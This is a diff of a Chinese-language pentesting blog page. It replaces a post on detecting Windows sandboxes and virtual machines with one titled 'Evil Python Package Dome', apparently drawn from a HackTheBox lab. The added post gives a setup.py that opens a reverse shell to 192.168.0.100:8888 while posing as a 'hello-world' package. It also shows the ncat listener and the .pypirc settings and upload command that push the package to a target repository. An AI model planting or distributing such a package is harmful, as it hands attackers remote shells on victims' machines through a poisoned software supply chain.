@@ -19,7 +19,7 @@
   <meta name="description" content="渗透测试笔记、日常问题记录">
   <meta name="author" content="Ayu">
   <meta name="keywords" content="">
-  <title>判断是否处于沙盒或虚拟机中 - Black Book</title>
+  <title>Evil Python Package Dome - Black Book</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
 
@@ -164,7 +164,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="判断是否处于沙盒或虚拟机中">
+            <span class="h2" id="subtitle" title="Evil Python Package Dome">
               
             </span>
 
@@ -174,8 +174,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-02-07 11:41" pubdate>
-        2021年2月7日 中午
+      <time datetime="2021-03-21 06:58" pubdate>
+        2021年3月21日 早上
       </time>
     </span>
   
@@ -186,7 +186,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      144 字
+      219 字
     </span>
   
 
@@ -196,7 +196,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      2
+      3
        分钟
     </span>
   
@@ -226,28 +226,32 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">判断是否处于沙盒或虚拟机中</h1>
+            <h1 style="display: none">Evil Python Package Dome</h1>
             
             <div class="markdown-body">
-              <p>Windows 下判断是否处于沙盒或虚拟机中</p>
+              <p>Evil Python Package Dome</p>
 <a id="more"></a>
 
-<p>来源推文: <a target="_blank" rel="noopener" href="https://twitter.com/ninjaparanoid/status/1358098804122083334?s=21">Twitter @NinjaParanoid</a></p>
+<p>文件结构</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">pypi_evil<br>├── __init__.py<br>└── setup.py<br></code></pre></div></td></tr></table></figure>
+<br/>
+##  创建恶意 setup.py
+
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> setuptools<br><span class="hljs-keyword">import</span> socket, subprocess, os<br><br><span class="hljs-comment"># Reverse Shell</span><br>s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>s.connect((<span class="hljs-string">&quot;192.168.0.100&quot;</span>,  <span class="hljs-number">8888</span>))<br>os.dup2(s.fileno(), <span class="hljs-number">0</span>)<br>os.dup2(s.fileno(), <span class="hljs-number">1</span>)<br>os.dup2(s.fileno(), <span class="hljs-number">2</span>)<br>p=subprocess.call([<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-i&quot;</span>]);<br><br><span class="hljs-comment"># 伪装 信息</span><br>setuptools.setup(<br>    name=<span class="hljs-string">&quot;hello-world&quot;</span>,<br>    version=<span class="hljs-string">&quot;0.0.1&quot;</span>,<br>    author=<span class="hljs-string">&quot;Example Author&quot;</span>,<br>    author_email=<span class="hljs-string">&quot;author@example.com&quot;</span>,<br>    description=<span class="hljs-string">&quot;A small example package&quot;</span>,<br>    url=<span class="hljs-string">&quot;https://github.com/pypa/sampleproject&quot;</span>,<br>    packages=setuptools.find_packages(),<br>    classifiers=[<br>        <span class="hljs-string">&quot;Programming Language :: Python :: 3&quot;</span>,<br>        <span class="hljs-string">&quot;License :: OSI Approved :: MIT License&quot;</span>,<br>        <span class="hljs-string">&quot;Operating System :: OS Independent&quot;</span>,<br>    ],<br>    python_requires=<span class="hljs-string">&#x27;&gt;=3.6&#x27;</span>,<br>)<br></code></pre></div></td></tr></table></figure>
 <br/>
 
-<p><img src="/assets/img/2021_02_07_%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%A4%84%E4%BA%8E%E6%B2%99%E7%9B%92%E6%88%96%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD/2021-02-07-PM-7.46.15.png" srcset="/img/loading.gif" alt="2021-02-07-PM-7.46.15"></p>
-<hr>
-<p>检查 Windows的显示驱动程序，VM显示为 <strong>Non-PnP</strong>，而物理计算机具有 <strong>PnP</strong>（即插即用）驱动程序</p>
+<p>测试是否运行正常</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">$ ncat -lvnp 8888<br><br><span class="hljs-comment">####</span><br><br>$ python3 setup.py<br></code></pre></div></td></tr></table></figure>
 <br/>
-
-<p>代码实现 <sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="Get the name of a monitor
-">[1]</span></a></sup></p>
-<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    DISPLAY_DEVICE dd;<br>    dd.cb = <span class="hljs-keyword">sizeof</span>(dd);<br>    <span class="hljs-keyword">int</span> deviceIndex = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (EnumDisplayDevices(<span class="hljs-number">0</span>, deviceIndex, &amp;dd, <span class="hljs-number">0</span>))<br>    &#123;<br>        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">wstring</span> deviceName = dd.DeviceName;<br>        <span class="hljs-keyword">int</span> monitorIndex = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (EnumDisplayDevices(deviceName.c_str(), monitorIndex, &amp;dd, <span class="hljs-number">0</span>))<br>        &#123;<br>            <span class="hljs-built_in">std</span>::wcout &lt;&lt; dd.DeviceName &lt;&lt; <span class="hljs-string">L&quot;, &quot;</span> &lt;&lt; dd.DeviceString &lt;&lt; <span class="hljs-string">L&quot;\n&quot;</span>;<br>            ++monitorIndex;<br>        &#125;<br>        ++deviceIndex;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></div></td></tr></table></figure>
+## 创建 .pypirc
+创建 `.pypirc` 用以将包分发到远程服务器(目标)
+<figure class="highlight ini"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-section">[distutils]</span><br><span class="hljs-attr">index-servers</span> = remote<br><br><span class="hljs-section">[remote]</span><br><span class="hljs-attr">repository</span> = &lt;second-repository URL&gt;<br><span class="hljs-attr">username</span> = &lt;second-repository username&gt;<br><span class="hljs-attr">password</span> = &lt;second-repository password&gt;<br></code></pre></div></td></tr></table></figure>
 <br/>
-
-<hr>
-<section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/20060584/get-the-name-of-a-monitor">Get the name of a monitor</a>
-<a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>
+## 分发到远程服务器
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">$ python3 setup.py sdist upload -r remote <br></code></pre></div></td></tr></table></figure>
+<br/>
+## Links & Resources
+- YoutuBe - Ippsec - HackTheBox - SneakyMailer
             </div>
             <hr>
             <div>
@@ -256,7 +260,7 @@
                   <div class="post-meta mr-3">
                     <i class="iconfont icon-category"></i>
                     
-                      <a class="hover-with-bg" href="/categories/Tips/">Tips</a>
+                      <a class="hover-with-bg" href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/">信息安全</a>
                     
                   </div>
                 
@@ -264,7 +268,7 @@
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/Tips/">Tips</a>
+                      <a class="hover-with-bg" href="/tags/Exploit/">Exploit</a>
                     
                   </div>
                 
@@ -277,18 +281,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/03/21/evil-python-package/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Evil Python Package Dome</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/02/06/Test-Page/">
-                        <span class="hidden-mobile">Test Page</span>
+                      <a href="/2021/02/07/%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%A4%84%E4%BA%8E%E6%B2%99%E7%9B%92%E6%88%96%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD/">
+                        <span class="hidden-mobile">判断是否处于沙盒或虚拟机中</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
